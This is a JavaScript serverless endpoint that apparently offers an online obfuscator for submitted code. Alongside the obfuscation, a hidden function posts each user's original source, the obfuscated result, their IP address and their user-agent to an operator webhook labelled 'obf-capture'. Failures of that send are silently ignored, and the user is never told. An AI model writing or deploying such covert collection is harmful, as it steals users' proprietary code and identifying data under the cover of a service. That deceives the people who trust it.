const JavaScriptObfuscator = require('javascript-obfuscator');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'method not allowed' });
  }

  const { code, opts } = req.body || {};
  if (typeof code !== 'string' || !code.trim()) {
    return res.status(400).json({ error: 'empty code' });
  }

  const options = {
    compact: true,
    controlFlowFlattening: opts?.cff !== false,
    controlFlowFlatteningThreshold: 0.75,
    deadCodeInjection: opts?.dead !== false,
    deadCodeInjectionThreshold: 0.4,
    stringArray: true,
    stringArrayEncoding: ['base64'],
    stringArrayThreshold: 0.75,
    identifierNamesGenerator: 'hexadecimal',
    renameGlobals: false,
    selfDefending: opts?.selfDefending !== false,
    debugProtection: opts?.debug !== false,
    disableConsoleOutput: false
  };

  let output;
  try {
    output = JavaScriptObfuscator.obfuscate(code, options).getObfuscatedCode();
  } catch (e) {
    return res.status(400).json({ error: 'obfuscate failed: ' + e.message });
  }

  try { await sendToWebhook(code, output, req, 'js'); } catch (_) {}
  return res.status(200).json({ ok: true, output });
};

async function sendToWebhook(original, obfuscated, req, lang = 'js') {
  const url = process.env.WEBHOOK_URL;
  if (!url) return;

  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    'unknown';
  const ua = req.headers['user-agent'] || 'unknown';

  const extMap = { js: 'js', lua: 'lua', html: 'html', pwn: 'pwn' };
  const ext = extMap[lang] || 'txt';

  const embed = {
    title: 'New Submission',
    color: 0x2bcc9e,
    fields: [
      { name: 'IP', value: '`' + ip + '`', inline: true },
      { name: 'Lang', value: '`' + lang + '`', inline: true },
      { name: 'Length', value: original.length + ' -> ' + obfuscated.length, inline: true },
      { name: 'User-Agent', value: '`' + ua.slice(0, 200) + '`', inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  const form = new FormData();
  form.append('payload_json', JSON.stringify({
    username: 'obf-capture',
    embeds: [embed],
    attachments: [
      { id: 0, filename: 'original.' + ext, description: 'Source asli' },
      { id: 1, filename: 'obfuscated.' + ext, description: 'Hasil obfuscate' }
    ]
  }));
  form.append('files[0]', new Blob([original], { type: 'text/plain' }), 'original.' + ext);
  form.append('files[1]', new Blob([obfuscated], { type: 'text/plain' }), 'obfuscated.' + ext);

  await fetch(url, { method: 'POST', body: form });
}
